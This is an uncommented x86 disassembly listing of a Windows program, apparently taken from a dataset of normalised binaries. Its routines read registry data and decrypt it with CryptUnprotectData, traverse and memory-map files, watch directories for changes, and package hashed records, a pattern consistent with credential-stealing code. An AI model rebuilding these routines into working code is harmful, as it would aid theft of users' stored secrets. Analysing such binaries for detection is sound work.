mov eax [ ebp - 0x4 ]
sub [ ebp - 0xc ] eax
add esp 0xc
push [ ebp - 0x8 ]
call [ CryptDestroyHash@IAT ]
add [ ebp - 0x10 ] 0x14
inc edi
cmp [ ebp - 0xc ] ebx
ja r-xdata
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
push 0x8004
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x14
call [ CryptCreateHash@IAT ]
mov eax edi
and eax 0xff0000
mov ecx edi
shr ecx 0x10
or eax ecx
mov ecx edi
and ecx 0xff00
mov edx edi
shl edx 0x10
or ecx edx
shr eax 0x8
shl ecx 0x8
or eax ecx
push ebx
mov [ ebp - 0x14 ] eax
push 0x4
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x8 ]
call esi
mov eax [ ebp + 0xc ]
push ebx
push [ eax ]
push [ eax + 0x4 ]
push [ ebp - 0x8 ]
call esi
push ebx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x2
push [ ebp - 0x8 ]
call [ CryptGetHashParam@IAT ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_409d4e
push ebp
mov ebp esp
sub esp 0x20c
xor ecx ecx
mov eax r--data
mov [ ebp - 0x4 ] 0x200
cmp ecx eax
je r-xdata
xor al al
leave
retn
push edi
lea ecx [ ebp - 0x20c ]
push ecx
push r--data
push eax
push 0x80000001
lea edi [ ebp - 0x4 ]
call sub_40c4dc
xor ecx ecx
pop edi
cmp al cl
jne r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push ecx
push ecx
push ecx
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x20c ]
push ecx
mov [ ebp - 0x8 ] eax
push ecx
lea eax [ ebp - 0xc ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
setne al
leave
retn
sub_409db7
push ebp
mov ebp esp
sub esp 0x468
push ebx
push esi
push edi
lea eax [ ebp - 0x464 ]
push eax
push [ ebp + 0x8 ]
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
mov ebx [ rw-data ]
lea eax [ ebp - 0x214 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x214 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x464 ]
call sub_401432
mov esi [ Sleep@IAT ]
pop ecx
push 0xa
mov edi eax
call esi
push 0x0
call esi
call sub_40f29b
mov esi rw-data
push edi
mov eax esi
call sub_4100dc
cmp [ ebx + eax * 4 ] edi
je r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
push 0x0
lea eax [ ebp - 0x464 ]
push eax
push [ ebp + 0x8 ]
push 0x70aa0202
push 0x70aa0201
call sub_40f29b
push eax
call sub_40ded2
call sub_40f29b
mov ebx edi
mov eax esi
call sub_410115
sub_409e79
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ae9d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x280
push ebx
push esi
push edi
lea eax [ esp + 0x5c ]
push eax
call sub_412634
xor ebx ebx
mov [ esp + 0x294 ] ebx
mov eax [ ebp + 0x14 ]
push [ eax ]
lea eax [ esp + 0x84 ]
push eax
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0x84 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x84 ]
push eax
call esi
push r--data
lea eax [ esp + 0x84 ]
push eax
call esi
mov esi [ ebp + 0x8 ]
xor edi edi
lea eax [ esp + 0x80 ]
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] esi
mov [ esp + 0x34 ] edi
test eax eax
jne r-xdata
push ebx
lea eax [ esp + 0x84 ]
push eax
call sub_40d7b3
mov [ esp + 0xc ] eax
or [ esp + 0xc ] 0xffffffff
jmp r-xdata
mov [ esp + 0x294 ] 0x1
mov [ esp + 0x38 ] edi
cmp edi ebx
jne r-xdata
push ebx
push eax
call [ GetFileSize@IAT ]
push ebx
mov edi eax
push edi
push ebx
push 0x2
push ebx
push [ esp + 0x20 ]
mov [ esp + 0x4c ] edi
call [ CreateFileMappingW@IAT ]
mov [ esp + 0x28 ] eax
cmp eax ebx
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x24 ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x38 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push [ esp + 0x34 ]
call sub_409b8f
add esp 0xc
test al al
je r-xdata
mov [ esp + 0x294 ] bl
cmp [ esp + 0x2c ] ebx
je r-xdata
push edi
push ebx
push ebx
push 0x4
push eax
call [ MapViewOfFile@IAT ]
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x80 ]
push eax
call sub_409db7
pop ecx
jmp r-xdata
mov eax [ esp + 0x38 ]
shr eax 0x1
call sub_412da8
mov edi eax
mov [ esp + 0x44 ] edi
cmp edi ebx
jne r-xdata
mov edi [ CloseHandle@IAT ]
cmp [ esp + 0x28 ] ebx
je r-xdata
push [ esp + 0x2c ]
call [ UnmapViewOfFile@IAT ]
mov [ esp + 0x294 ] bl
cmp [ esp + 0x2c ] ebx
je r-xdata
push r--data
mov ebx r--data
mov ecx esi
call sub_412df3
xor ebx ebx
mov [ esp + 0x3c ] eax
cmp eax ebx
jne r-xdata
cmp [ esp + 0xc ] ebx
je r-xdata
push [ esp + 0x28 ]
call edi
mov edi [ CloseHandle@IAT ]
cmp [ esp + 0x28 ] ebx
je r-xdata
push [ esp + 0x2c ]
call [ UnmapViewOfFile@IAT ]
xor esi esi
mov [ esp + 0x40 ] ebx
cmp [ esp + 0x38 ] ebx
jbe r-xdata
mov [ esp + 0x294 ] bl
cmp [ esp + 0x2c ] ebx
je r-xdata
or [ esp + 0x294 ] 0xffffffff
lea eax [ esp + 0x5c ]
push eax
call sub_4125f1
mov al 0x1
cmp [ esp + 0xc ] 0xffffffff
je r-xdata
cmp [ esp + 0xc ] ebx
je r-xdata
push [ esp + 0x28 ]
call edi
mov eax [ ebp + 0x14 ]
push edi
push [ eax + 0x4 ]
push ebx
call sub_409a44
add esp 0xc
test al al
je r-xdata
mov eax [ esp + 0x48 ]
mov ax [ esi + eax ]
mov [ esp + 0x40 ] ax
lea eax [ ebx + edi ]
push eax
push 0x10
lea eax [ esp + 0x48 ]
push eax
call [ esp + 0x48 ]
add esi 0x2
inc ebx
cmp esi [ esp + 0x38 ]
jb r-xdata
mov edi [ CloseHandle@IAT ]
cmp [ esp + 0x28 ] ebx
je r-xdata
push [ esp + 0x2c ]
call [ UnmapViewOfFile@IAT ]
push [ esp + 0xc ]
call edi
mov bl 0x1
cmp [ esp + 0xc ] 0xffffffff
je r-xdata
push edi
call sub_412d05
xor ebx ebx
lea esi [ esp + 0x4c ]
call sub_40c9fb
mov [ esp + 0x294 ] 0x2
push edi
push 0x10
pop edi
mov eax esi
call sub_40cb2c
lea esi [ esp + 0x14 ]
call sub_40c9fb
mov [ esp + 0x294 ] 0x3
lea eax [ esp + 0x3c ]
push eax
push 0x4
pop edi
mov eax esi
mov [ esp + 0x40 ] 0x77010101
call sub_40cb2c
push r--data
mov eax esi
push eax
call sub_40ccf8
xor esi esi
push esi
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
push esi
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
push [ esp + 0x10 ]
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
push esi
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] esi
call sub_40cb2c
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] esi
call sub_40cb2c
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] esi
call sub_40cb2c
call [ GetACP@IAT ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_40cce2
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x3
call sub_40cb2c
mov edi [ esp + 0x50 ]
push edi
lea eax [ esp + 0x18 ]
push eax
call sub_40cce2
cmp edi esi
jle r-xdata
cmp [ esp + 0xc ] ebx
je r-xdata
push [ esp + 0x28 ]
call edi
mov ecx [ esp + 0x28c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push [ esp + 0xc ]
call edi
push r--data
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
push [ esp + 0x18 ]
lea eax [ esp + 0x18 ]
push eax
call sub_40cccc
push [ esp + 0x18 ]
push esi
push 0x64
call sub_40ed22
push eax
push esi
mov esi [ ebp + 0x8 ]
push 0xff0f8211
push [ esp + 0x30 ]
push [ esp + 0x30 ]
call sub_40ffc9
mov [ esp + 0x294 ] 0x2
lea esi [ esp + 0x14 ]
call sub_40c938
mov [ esp + 0x294 ] 0x1
lea esi [ esp + 0x4c ]
call sub_40c938
mov edi [ esp + 0x44 ]
push [ esp + 0x4c ]
lea eax [ esp + 0x18 ]
call sub_40cb2c
xor bl bl
jmp r-xdata
cmp [ esp + 0xc ] 0xffffffff
je r-xdata
or [ esp + 0x294 ] 0xffffffff
lea eax [ esp + 0x5c ]
push eax
call sub_4125f1
mov al bl
jmp r-xdata
push [ esp + 0xc ]
call edi
sub_40a2a0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x664
push ebx
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ esp + 0x18 ] ax
lea eax [ esp + 0x1a ]
push eax
call sub_405830
mov ebx [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0x14 ]
push eax
call ebx
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ esp + 0x14 ]
push eax
call esi
mov edi [ lstrlenW@IAT ]
lea eax [ esp + 0x10 ]
push eax
call edi
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
mov ecx [ ebp + 0x14 ]
lea eax [ esp + 0x10 ]
push eax
mov [ ecx ] eax
call edi
lea eax [ esp + 0x10 ]
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
cmp eax sub_409e79
je r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x46c ]
push eax
call ebx
push r--data
lea eax [ esp + 0x46c ]
push eax
call esi
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x46c ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov esi [ lstrcmpW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x248 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x218 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x218 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x248 ]
push eax
call esi
test eax eax
je r-xdata
push [ ebp + 0x14 ]
lea eax [ esp + 0x21c ]
push eax
lea eax [ esp + 0x18 ]
push eax
push [ ebp + 0x8 ]
call sub_409e79
add esp 0x10
test al al
je r-xdata
sub_40a3f2
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41af39
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x690
push ebx
push esi
push edi
lea esi [ esp + 0x20 ]
call sub_40c9fb
and [ esp + 0x6a4 ] 0x0
mov edi rw-data
mov eax rw-data
mov ecx edi
call sub_40c1af
lea eax [ esp + 0x18 ]
push eax
call sub_409d4e
pop ecx
test al al
jne r-xdata
lea eax [ esp + 0xc ]
call sub_409c5a
test al al
je r-xdata
or [ esp + 0x6a4 ] 0xffffffff
lea esi [ esp + 0x20 ]
call sub_40c938
xor al al
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x10 ]
lea edx [ esp + 0x498 ]
call sub_409c74
pop ecx
pop ecx
push [ esp + 0x1c ]
call [ LocalFree@IAT ]
lea eax [ esp + 0x490 ]
push eax
push [ esp + 0x10 ]
lea ebx [ esp + 0x18 ]
call sub_409b23
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x38 ]
push eax
xor ebx ebx
push ebx
push ebx
push 0x2e
push ebx
call [ SHGetFolderPathW@IAT ]
test eax eax
je r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_409afe
pop ecx
pop ecx
jmp r-xdata
mov esi [ PathRemoveFileSpecW@IAT ]
lea eax [ esp + 0x38 ]
push eax
call esi
lea eax [ esp + 0x38 ]
push eax
call esi
lea eax [ esp + 0x38 ]
push eax
call [ lstrlenW@IAT ]
lea eax [ esp + 0x38 ]
test eax eax
je r-xdata
or [ esp + 0x6a4 ] 0xffffffff
lea esi [ esp + 0x20 ]
call sub_40c938
mov al bl
jmp r-xdata
mov edx rw-data
mov ecx edi
call sub_40c257
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_409afe
pop ecx
pop ecx
mov bl 0x1
jmp r-xdata
xor eax eax
cmp eax sub_40a2a0
je r-xdata
mov ecx [ esp + 0x69c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x38 ]
push eax
lea eax [ esp + 0x494 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ esp + 0x494 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x240 ]
push eax
lea eax [ esp + 0x494 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0x14 ] eax
cmp eax 0xffffffff
je r-xdata
mov esi [ lstrcmpW@IAT ]
push ebx
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x270 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x240 ] 0x10
je r-xdata
push [ esp + 0x14 ]
call [ FindClose@IAT ]
lea eax [ esp + 0x240 ]
push eax
push [ esp + 0x18 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x270 ]
push eax
call esi
test eax eax
je r-xdata
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x244 ]
push eax
lea eax [ esp + 0x40 ]
push eax
push [ ebp + 0x8 ]
call sub_40a2a0
add esp 0x10
test al al
je r-xdata
sub_40a61f
push esi
xor eax eax
jmp r-xdata
movzx ecx [ edx ]
test cx cx
jne r-xdata
movzx ecx cx
lea esi [ ecx - 0x61 ]
add edx 0x2
cmp si 0x19
ja r-xdata
pop esi
retn
lea esi [ ecx - 0x30 ]
cmp si 0x9
ja r-xdata
add ecx 0xffe0
lea esi [ ecx - 0x41 ]
cmp si 0x5
ja r-xdata
movzx ecx si
jmp r-xdata
xor eax eax
pop esi
retn
add ecx 0xffc9
movzx ecx cx
shl eax 0x4
add eax ecx
sub_40a66c
push ebp
mov ebp esp
sub esp 0x3c
push ebx
mov ebx [ RegOpenKeyExW@IAT ]
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x20019
xor edi edi
push edi
push r--data
push 0x80000002
call ebx
test eax eax
je r-xdata
push esi
mov esi [ RegCloseKey@IAT ]
xor al al
jmp r-xdata
push [ ebp - 0x4 ]
call esi
xor al al
jmp r-xdata
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x8 ]
call [ RegQueryInfoKeyW@IAT ]
push [ ebp - 0x8 ]
test eax eax
jne r-xdata
pop edi
pop ebx
leave
retn
pop esi
call esi
call esi
mov ecx [ ebp - 0xc ]
xor eax eax
lea edx [ ebp - 0x3c ]
mov [ ebp + ecx * 2 - 0x3c ] ax
call sub_40a61f
mov [ ebp + edi - 0x1c ] eax
add edi 0x4
cmp edi 0x10
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x20019
push 0x0
push [ edi + r--data ]
mov [ ebp - 0xc ] 0x10
push [ ebp - 0x4 ]
call ebx
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call esi
xor eax eax
mov ecx [ eax * 4 + r--data ]
mov cl [ ebp + ecx - 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ eax + edx ] cl
inc eax
cmp eax 0x10
jl r-xdata
mov al 0x1
sub_40a736
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x804
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ eax + 0x4 ]
push edi
push ebx
call [ lstrlenW@IAT ]
cmp eax 0x3
jle r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
movzx eax [ ebx + 0x6 ]
cmp eax 0x30
jb r-xdata
cmp eax 0x39
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
mov [ ebp + 0x10 ] 0x800
je r-xdata
lea eax [ ebp - 0x800 ]
push eax
push ebx
push [ ebp + 0x8 ]
lea edi [ ebp + 0x10 ]
push 0x80000002
call sub_40c4dc
test al al
je r-xdata
mov eax [ esi ]
inc [ eax ]
push ebx
push esi
call sub_40ccf8
mov edi [ ebp + 0x10 ]
push edi
push esi
call sub_40cce2
lea eax [ ebp - 0x800 ]
push eax
mov eax esi
call sub_40cb2c
sub_40a7b8
push ebp
mov ebp esp
sub esp 0x804
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ eax + 0x4 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
mov [ ebp + 0x10 ] 0x800
call [ lstrlenW@IAT ]
jmp r-xdata
dec eax
jns r-xdata
cmp [ esi + eax * 2 ] 0x5c
je r-xdata
lea eax [ esi + eax * 2 + 0x2 ]
mov [ ebp + 0x8 ] eax
test esi esi
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
lea eax [ ebp - 0x800 ]
push eax
push r--data
push esi
push 0x80000002
lea edi [ ebp + 0x10 ]
call sub_40c4dc
test al al
je r-xdata
push [ ebp + 0x8 ]
mov eax [ ebx ]
inc [ eax ]
push ebx
call sub_40ccf8
mov edi [ ebp + 0x10 ]
push edi
push ebx
call sub_40cce2
lea eax [ ebp - 0x800 ]
push eax
mov eax ebx
call sub_40cb2c
sub_40a83c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ac35
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1074
call sub_406c70
push ebx
push esi
push edi
lea eax [ esp + 0x24 ]
push eax
call sub_412634
and [ esp + 0x108c ] 0x0
push [ ebp + 0x8 ]
call sub_40d0df
lea eax [ esp + 0x70 ]
push eax
call sub_40a66c
pop ecx
test al al
jne r-xdata
lea eax [ esp + 0x70 ]
test eax eax
je r-xdata
or [ esp + 0x108c ] 0xffffffff
lea eax [ esp + 0x24 ]
push eax
call sub_4125f1
xor al al
xor ecx ecx
mov eax r--data
mov [ esp + 0x10 ] 0x1000
cmp ecx eax
je r-xdata
mov esi [ esp + 0x3c ]
push 0x10
pop edi
push eax
lea eax [ esp + 0x3c ]
mov [ esp + 0x18 ] 0x3309000
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x1d ] edi
call sub_40cb2c
lea eax [ esp + 0x14 ]
push eax
push 0xd
pop edi
lea eax [ esp + 0x2c ]
mov [ esp + 0x21 ] esi
call sub_40cb2c
lea ecx [ esp + 0x80 ]
push ecx
push r--data
push eax
mov ebx 0x80000002
push ebx
lea edi [ esp + 0x20 ]
call sub_40c4dc
test al al
je r-xdata
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
xor ecx ecx
mov eax r--data
mov [ esp + 0x10 ] 0x1000
cmp ecx eax
je r-xdata
lea eax [ esp + 0x80 ]
test eax eax
je r-xdata
xor ecx ecx
mov eax r--data
mov [ esp + 0x10 ] 0x1000
cmp ecx eax
je r-xdata
lea ecx [ esp + 0x80 ]
push ecx
push 0x0
push eax
push ebx
lea edi [ esp + 0x20 ]
call sub_40c4dc
test al al
je r-xdata
mov esi [ esp + 0x3c ]
push eax
lea eax [ esp + 0x3c ]
mov [ esp + 0x18 ] 0x62b87d5
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x1d ] edi
call sub_40cb2c
lea eax [ esp + 0x14 ]
push eax
push 0xd
pop edi
lea eax [ esp + 0x2c ]
mov [ esp + 0x21 ] esi
call sub_40cb2c
xor ecx ecx
mov eax r--data
mov [ esp + 0x10 ] 0x1000
cmp ecx eax
je r-xdata
lea ecx [ esp + 0x80 ]
push ecx
push 0x0
push eax
push ebx
lea edi [ esp + 0x20 ]
call sub_40c4dc
test al al
je r-xdata
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
lea esi [ esp + 0x50 ]
call sub_40c9fb
mov [ esp + 0x108c ] 0x1
lea eax [ esp + 0x10 ]
push eax
push 0x4
xor esi esi
pop edi
lea eax [ esp + 0x54 ]
mov [ esp + 0x14 ] esi
call sub_40cb2c
mov ecx [ ebp + 0x8 ]
lea eax [ esp + 0x50 ]
mov [ esp + 0x4c ] eax
lea eax [ esp + 0x48 ]
push eax
push sub_40a7b8
push esi
push 0x1
push r--data
mov edx ebx
mov [ esp + 0x5c ] ecx
call sub_40c30b
mov edi [ esp + 0x54 ]
cmp edi esi
jne r-xdata
lea ecx [ esp + 0x80 ]
push ecx
push 0x0
push eax
push ebx
lea edi [ esp + 0x20 ]
call sub_40c4dc
test al al
je r-xdata
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
lea eax [ esp + 0x80 ]
test eax eax
je r-xdata
cmp [ esp + 0x50 ] esi
je r-xdata
mov [ esp + 0x108c ] 0x0
lea esi [ esp + 0x50 ]
call sub_40c938
jmp r-xdata
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
lea eax [ esp + 0x80 ]
test eax eax
je r-xdata
mov esi [ esp + 0x3c ]
push eax
lea eax [ esp + 0x3c ]
mov [ esp + 0x18 ] 0xd2c74cf
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x1d ] edi
call sub_40cb2c
lea eax [ esp + 0x14 ]
push eax
push 0xd
pop edi
lea eax [ esp + 0x2c ]
mov [ esp + 0x21 ] esi
call sub_40cb2c
lea esi [ esp + 0x60 ]
call sub_40c9fb
mov [ esp + 0x108c ] 0x2
lea eax [ esp + 0x10 ]
push eax
push 0x4
xor esi esi
pop edi
lea eax [ esp + 0x64 ]
mov [ esp + 0x14 ] esi
call sub_40cb2c
mov ecx [ ebp + 0x8 ]
lea eax [ esp + 0x60 ]
mov [ esp + 0x4c ] eax
lea eax [ esp + 0x48 ]
push eax
push sub_40a736
push 0x1
push esi
push r--data
mov edx ebx
call sub_40c30b
mov edi [ esp + 0x64 ]
cmp edi esi
je r-xdata
push [ esp + 0x50 ]
mov esi [ esp + 0x40 ]
lea eax [ esp + 0x3c ]
mov [ esp + 0x18 ] 0x3475f3
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x1d ] edi
call sub_40cb2c
lea eax [ esp + 0x14 ]
push eax
push 0xd
pop edi
lea eax [ esp + 0x2c ]
mov [ esp + 0x21 ] esi
call sub_40cb2c
lea eax [ esp + 0x80 ]
test eax eax
je r-xdata
mov esi [ esp + 0x3c ]
push eax
lea eax [ esp + 0x3c ]
mov [ esp + 0x18 ] 0x7277b0d
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x1d ] edi
call sub_40cb2c
lea eax [ esp + 0x14 ]
push eax
push 0xd
pop edi
lea eax [ esp + 0x2c ]
mov [ esp + 0x21 ] esi
call sub_40cb2c
lea esi [ esp + 0x14 ]
call sub_40c9fb
mov [ esp + 0x108c ] 0x3
lea eax [ esp + 0x24 ]
push eax
mov ecx esi
call sub_41289d
call sub_40ed22
push [ esp + 0x18 ]
mov esi [ ebp + 0x8 ]
push 0x0
push 0xf
push eax
push 0x0
push 0x80719601
push [ esp + 0x30 ]
push [ esp + 0x30 ]
call sub_40ffc9
test al al
jne r-xdata
cmp [ esp + 0x60 ] esi
je r-xdata
mov esi [ esp + 0x3c ]
push eax
lea eax [ esp + 0x3c ]
mov [ esp + 0x18 ] 0x9258bf1
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x1d ] edi
call sub_40cb2c
lea eax [ esp + 0x14 ]
push eax
push 0xd
pop edi
lea eax [ esp + 0x2c ]
mov [ esp + 0x21 ] esi
call sub_40cb2c
mov bl 0x1
jmp r-xdata
xor bl bl
push [ esp + 0x60 ]
mov esi [ esp + 0x40 ]
lea eax [ esp + 0x3c ]
mov [ esp + 0x18 ] 0x704b24ec
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x1d ] edi
call sub_40cb2c
lea eax [ esp + 0x14 ]
push eax
push 0xd
pop edi
lea eax [ esp + 0x2c ]
mov [ esp + 0x21 ] esi
call sub_40cb2c
mov [ esp + 0x108c ] 0x2
lea esi [ esp + 0x14 ]
call sub_40c938
mov [ esp + 0x108c ] 0x1
lea esi [ esp + 0x60 ]
call sub_40c938
mov [ esp + 0x108c ] 0x0
lea esi [ esp + 0x50 ]
call sub_40c938
or [ esp + 0x108c ] 0xffffffff
lea eax [ esp + 0x24 ]
push eax
call sub_4125f1
mov al bl
jmp r-xdata
mov ecx [ esp + 0x1084 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_40aca2
push ebx
push esi
push edi
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
cmp [ rw-data ] 0x0
mov bl 0x1
jbe r-xdata
xor bl bl
dec [ rw-data ]
mov edi [ esp + 0x10 ]
mov eax rw-data
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
je r-xdata
push [ rw-data ]
call [ ReleaseMutex@IAT ]
pop edi
pop esi
mov al bl
pop ebx
retn
mov esi [ rw-data ]
imul esi esi 0xc
add esi rw-data
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub_40acfe
push ebx
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
cmp [ rw-data ] 0x20
mov bl 0x1
jae r-xdata
xor bl bl
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ rw-data ]
imul edi edi 0xc
add edi rw-data
inc [ rw-data ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
jmp r-xdata
push [ rw-data ]
call [ ReleaseMutex@IAT ]
mov al bl
pop ebx
retn
sub_40ad4c
push ebp
mov ebp esp
sub esp 0x214
push esi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x214 ]
push eax
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x214 ]
push eax
call esi
push [ ebp + 0xc ]
lea eax [ ebp - 0x214 ]
push eax
call esi
xor esi esi
push esi
push esi
push 0x3
push esi
push 0x7
push 0xc0000000
lea eax [ ebp - 0x214 ]
push eax
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push edi
push esi
push esi
push esi
push 0x2
push esi
push eax
mov [ ebp - 0xc ] eax
call [ CreateFileMappingW@IAT ]
lea edi [ ebp - 0x214 ]
mov [ ebp - 0x8 ] eax
call sub_40e7b9
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_40acfe
pop ecx
test al al
setne al
pop edi
xor al al
jmp r-xdata
pop esi
leave
retn
sub_40addf
mov eax ebx
push ebp
shl eax 0x2
call sub_412da8
mov ebp eax
test ebp ebp
je r-xdata
xor al al
pop ebp
retn
xor eax eax
test ebx ebx
je r-xdata
push esi
push edi
mov ecx [ esp + 0x8 ]
add ecx 0x18
push 0xffffffff
push 0x0
push ebp
push ebx
call [ WaitForMultipleObjects@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x10 ]
imul eax eax 0x28
lea esi [ eax + ecx ]
mov eax [ esi + 0x24 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov edx [ ecx ]
mov [ ebp + eax * 4 ] edx
inc eax
add ecx 0x28
cmp eax ebx
jb r-xdata
mov eax [ esi + 0x24 ]
mov edx 0x800
mov ecx edx
lea edi [ eax + 0xc ]
push r--data
push edi
call sub_40e7e3
test al al
je r-xdata
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push ecx
lea eax [ esi + 0x8 ]
push eax
push ecx
push 0x1
push ecx
push edx
push [ esi + 0x24 ]
push [ esi + 0x4 ]
call [ ReadDirectoryChangesW@IAT ]
test eax eax
jns r-xdata
push edi
push [ esi + 0x1c ]
call sub_40ad4c
pop ecx
pop ecx
push ebp
call sub_412d05
pop edi
pop esi
sub_40ae89
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x128c
call sub_406c70
push ebx
push esi
push edi
call sub_40eb63
xor edi edi
jmp r-xdata
lea eax [ esp + 0x14 ]
push eax
